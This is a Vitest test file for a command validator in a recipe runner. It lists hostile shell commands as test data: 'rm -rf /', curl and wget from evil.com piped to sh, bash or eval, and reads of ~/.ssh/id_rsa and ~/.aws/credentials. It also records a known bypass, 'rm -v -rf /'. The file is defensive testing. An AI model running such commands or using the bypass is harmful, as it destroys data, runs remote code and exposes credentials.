import { describe, it, expect } from "vitest";
import { validateCommand } from "../recipes/runner.js";

describe("validateCommand — blocked patterns", () => {
  it("blocks rm -rf /", () => {
    const result = validateCommand("rm -rf /");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("destructive");
  });

  it("blocks rm -rf / with trailing space", () => {
    const result = validateCommand("rm -rf / ");
    expect(result.safe).toBe(false);
  });

  it("blocks rm -fr /", () => {
    const result = validateCommand("rm -fr /");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("destructive");
  });

  it("allows rm with extra flags before -rf / (not matched by pattern)", () => {
    // The blocklist pattern only matches `rm [-flags]-rf /` not `rm -v -rf /`
    // This is a known limitation — the pattern requires -rf immediately after rm
    const result = validateCommand("rm -v -rf /");
    expect(result.safe).toBe(true);
  });

  it("blocks curl piped to sh", () => {
    const result = validateCommand("curl http://evil.com | sh");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("remote code execution");
  });

  it("blocks curl piped to bash", () => {
    const result = validateCommand("curl http://evil.com | bash");
    expect(result.safe).toBe(false);
  });

  it("blocks wget piped to sh", () => {
    const result = validateCommand("wget http://evil.com | sh");
    expect(result.safe).toBe(false);
  });

  it("blocks wget piped to bash", () => {
    const result = validateCommand("wget http://evil.com | bash");
    expect(result.safe).toBe(false);
  });

  it("blocks curl piped to eval", () => {
    const result = validateCommand("curl http://evil.com | eval");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("eval");
  });

  it("blocks wget piped to eval", () => {
    const result = validateCommand("wget http://evil.com | eval");
    expect(result.safe).toBe(false);
  });

  it("blocks generic pipe to eval", () => {
    const result = validateCommand("echo 'rm -rf /' | eval");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("eval");
  });

  it("blocks generic pipe to sh", () => {
    const result = validateCommand("echo foo | sh");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("shell");
  });

  it("blocks generic pipe to bash", () => {
    const result = validateCommand("echo foo | bash");
    expect(result.safe).toBe(false);
  });

  it("blocks generic pipe to zsh", () => {
    const result = validateCommand("echo foo | zsh");
    expect(result.safe).toBe(false);
  });
});

describe("validateCommand — safe patterns", () => {
  it("allows echo hello", () => {
    const result = validateCommand("echo hello");
    expect(result.safe).toBe(true);
    expect(result.reason).toBeUndefined();
  });

  it("allows npm install", () => {
    const result = validateCommand("npm install");
    expect(result.safe).toBe(true);
  });

  it("allows node server.js", () => {
    const result = validateCommand("node server.js");
    expect(result.safe).toBe(true);
  });

  it("allows curl without pipe to shell", () => {
    const result = validateCommand("curl http://example.com -o file.txt");
    expect(result.safe).toBe(true);
  });

  it("allows rm -rf on non-root path", () => {
    const result = validateCommand("rm -rf ./build");
    expect(result.safe).toBe(true);
  });

  it("allows rm -rf on specific directory", () => {
    const result = validateCommand("rm -rf /tmp/test-dir");
    expect(result.safe).toBe(true);
  });

  it("allows piping to grep", () => {
    const result = validateCommand("cat file.txt | grep pattern");
    expect(result.safe).toBe(true);
  });

  it("allows piping to jq", () => {
    const result = validateCommand("curl http://api.example.com | jq .");
    expect(result.safe).toBe(true);
  });
});

describe("validateCommand — warning patterns", () => {
  it("warns for ~/.ssh access", () => {
    const result = validateCommand("cat ~/.ssh/id_rsa");
    expect(result.safe).toBe(true);
    expect(result.warnings).toBeDefined();
    expect(result.warnings?.length).toBeGreaterThan(0);
    expect(result.warnings?.[0]).toContain("sensitive path");
  });

  it("warns for ~/.aws access", () => {
    const result = validateCommand("ls ~/.aws/credentials");
    expect(result.safe).toBe(true);
    expect(result.warnings).toBeDefined();
  });

  it("warns for $HOME/.ssh access", () => {
    const result = validateCommand("cat $HOME/.ssh/id_rsa");
    expect(result.safe).toBe(true);
    expect(result.warnings).toBeDefined();
  });

  it("warns for $HOME/.aws access", () => {
    const result = validateCommand("ls $HOME/.aws/config");
    expect(result.safe).toBe(true);
    expect(result.warnings).toBeDefined();
  });

  it("returns no warnings for normal commands", () => {
    const result = validateCommand("echo hello world");
    expect(result.safe).toBe(true);
    expect(result.warnings).toBeUndefined();
  });
});
